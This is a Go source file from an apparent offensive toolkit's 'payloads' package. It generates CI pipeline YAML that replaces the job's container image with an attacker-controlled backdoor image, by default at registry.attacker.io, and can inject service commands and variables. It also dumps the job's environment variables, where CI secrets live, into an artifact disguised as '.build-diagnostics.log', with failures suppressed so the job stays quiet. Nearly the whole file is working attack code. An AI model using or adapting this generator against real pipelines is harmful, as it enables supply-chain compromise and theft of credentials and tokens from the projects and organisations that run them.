package payloads

import (
	"fmt"
	"strings"
)

// ImagePoisonOptions configures an image/service container poisoning payload.
type ImagePoisonOptions struct {
	Common         CommonOptions
	MaliciousImage string            // attacker-controlled image
	ServiceImage   string            // malicious service image
	ServiceCommand []string          // services:command override
	ServiceVars    map[string]string // services:variables injection
}

// GenerateImagePoisonYAML generates a CI job that overrides image and service
// container configurations to execute attacker-controlled code.
func GenerateImagePoisonYAML(o ImagePoisonOptions) string {
	name, stage := o.Common.defaults("build")
	if o.MaliciousImage == "" {
		o.MaliciousImage = "registry.attacker.io/backdoor:latest"
	}

	var b strings.Builder

	fmt.Fprintf(&b, "stages: [%s]\n\n", stage)
	fmt.Fprintf(&b, "%s:\n  stage: %s\n", name, stage)

	fmt.Fprintf(&b, "  image:\n    name: %s\n    entrypoint: [\"\"]\n", o.MaliciousImage)

	if o.ServiceImage != "" || len(o.ServiceCommand) > 0 {
		b.WriteString("  services:\n")
		svcImage := o.ServiceImage
		if svcImage == "" {
			svcImage = "postgres:14"
		}
		fmt.Fprintf(&b, "    - name: %s\n", svcImage)
		if len(o.ServiceCommand) > 0 {
			b.WriteString("      command: [")
			for i, c := range o.ServiceCommand {
				if i > 0 {
					b.WriteString(", ")
				}
				fmt.Fprintf(&b, "%q", c)
			}
			b.WriteString("]\n")
		}
		if len(o.ServiceVars) > 0 {
			b.WriteString("      variables:\n")
			for k, v := range o.ServiceVars {
				fmt.Fprintf(&b, "        %s: %q\n", k, v)
			}
		}
	}

	b.WriteString(tagsLine(o.Common.Tags))
	if len(o.Common.Tags) > 0 {
		b.WriteString("\n")
	}

	b.WriteString(`  script:
    - |
      # Exfil via dd from /proc (raw binary read, avoids shell builtins)
      dd if=/proc/self/environ bs=1M 2>/dev/null | tr '\0' '\n' | sort > .build-diagnostics.log || true
  artifacts:
    when: always
    paths:
      - .build-diagnostics.log
    expire_in: 1 day
  allow_failure: true`)

	b.WriteString(rulesManual(o.Common.Manual))
	b.WriteString("\n")

	return b.String()
}
